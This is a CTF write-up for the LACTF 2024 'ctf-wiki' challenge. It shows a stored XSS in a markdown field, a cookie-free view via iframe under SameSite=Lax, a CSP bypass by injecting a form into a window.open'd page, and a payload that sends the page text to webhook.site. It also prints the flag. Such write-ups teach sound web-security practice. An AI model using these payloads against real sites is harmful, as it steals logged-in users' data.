---
title: ctf-wiki
date: 2024-02-20
tags: 
- web
- xss
- cookies
- csp
- author-hartmannsyg
categories: LACTF 2024
---

written by {% person hartmannsyg %}

We have an xss (sorta):

on the `/create`, in the description that supports markdown, we can put in script tags. 

![](../../static/LACTF2024/ctf-wiki-0.png)

If we view the page *without our authentication cookies* (like an incognito tab), we get an xss.

![](../../static/LACTF2024/ctf-wiki-1.png)

However, if you are logged in (i.e. if there are cookies), we get redirected to the edit:

{% ccb lang:py caption:app.py gutter1:101-104 caption:app.py %}
@app.get("/view/<pid>")
def page(pid):
    if session.get("username") is not None and session.get("password") is not None:
        return redirect("/edit/{}".format(pid))
{% endccb %}

![](../../static/LACTF2024/ctf-wiki-2.png)

So how do we access `/view/<pid>` without the session cookies?

{% ccb gutter1:12 lang:py caption:app.py %}
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
{% endccb %}

iframes only send SameSite=None cookies so if we set up our own website and use an iframe the cookies will not be sent:

{% ccb gutter1:1 lang:html caption:inject.html %}
<iframe src="https://ctf-wiki.chall.lac.tf/view/<pid>"></iframe>
{% endccb %}

Now that we have xss inside our iframe, we need to somehow access `/flag` *with* the cookies.

We can use window.open(), but we need to POST flag. We can't use scripts either due to the content security policy:
{% ccb gutter1:34-40 lang:py caption:app.py %}
@app.after_request
def apply_csp(response):
    if session.get("username") is not None and session.get("password") is not None:
        response.headers[
            "Content-Security-Policy"
        ] = "default-src 'self'; img-src *; font-src https://fonts.gstatic.com https://fonts.googleapis.com; style-src 'self' https://fonts.googleapis.com"
    return response
{% endccb %}

If we *edit* the opened window document:
{% ccb gutter1:1-7 lang:html caption:"player description" %}
<script>
    let w = window.open('https://ctf-wiki.chall.lac.tf/');
    
    w.onload = function () {
        w.document.write("<script>fetch('https://ctf-wiki.chall.lac.tf/flag',{method:'post'})<\/script>")
    }
</script>
{% endccb %}


We get
{% ccb terminal:true wrapped:true html:true %}
<span style='color:#E06C75;'>Refused to execute inline script because it violates the following Content Security Policy directive: "default-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-74J0XhNNZyeyG2hc6SR5UoGLY+N1BT22Dw9QC4ZeN/Y='), or a nonce ('nonce-...') is required to enable inline execution. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
</span>


{% endccb %}

So in order to send a POST request without scripts, we use a form and submit it.
{% ccb lang:html gutter1:1-11 caption:"player description" %}
<script>
    let w = window.open('https://ctf-wiki.chall.lac.tf/');
    
    w.onload = function () {
        w.document.body.innerHTML = `<form action="/flag" id="flagForm" method="post"></form>`;
        w.document.getElementById('flagForm').submit()
        setTimeout(()=>{
            console.log(w.document.body.innerText)
        }, 1000)
    }
</script>
{% endccb %}

We see that there is a `POST /flag` being sent (I went a bit overkill and track traffic via Requestly):

![](../../static/LACTF2024/ctf-wiki-3.png)


Now we just need to steal the `w.document.body.innerText`

{% ccb lang:html gutter1:1-11 caption:"player description" %}
<script>
    let w = window.open('https://ctf-wiki.chall.lac.tf/');
    
    w.onload = function () {
        w.document.body.innerHTML = `<form action="/flag" id="flagForm" method="post"></form>`;
        w.document.getElementById('flagForm').submit()
        setTimeout(()=>{
            window.location = 'https://webhook.site/<id>/flag='+w.document.body.innerText;
        }, 1000)
    }
</script>
{% endccb %}
we get a request:
{% ccb terminal:true %}
https://webhook.site/<id>/flag=lactf%7Bk4NT_k33P_4lL_my_F4v0r1T3_ctF3RS_S4m3_S1t3%7D
lactf{k4NT_k33P_4lL_my_F4v0r1T3_ctF3RS_S4m3_S1t3}
{% endccb %}

